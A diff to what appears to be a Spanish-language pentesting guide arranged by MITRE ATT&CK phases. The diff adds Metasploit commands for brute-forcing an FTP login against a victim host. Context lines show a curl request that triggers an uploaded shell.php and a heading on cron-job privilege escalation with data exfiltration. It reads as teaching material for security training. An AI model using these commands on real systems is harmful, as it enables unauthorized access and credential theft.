@@ -63,6 +63,15 @@ Ahora, cuando alguien acceda a la ruta donde se encuentra el exploit, obtendremo
 curl http://192.168.12.3/shell.php
 ```
 
+Para realizar fuerza bruta contra FTP desde msf.
+```sh
+search ftp_login
+use 0
+set RHOST <IP_VICTIMA>
+set USERNAME <nombre del usuario>
+set PASS_FILE <archivo con contraseñas>
+run
+```
 ## Bloque 2: MITRE ATT&CK fase 6: TA0004. Privilege scalation
 
 ### Escalada de privilegios a través de trabajos cron: Exfiltración de información privada (T1053. Scheduled Task/Job)
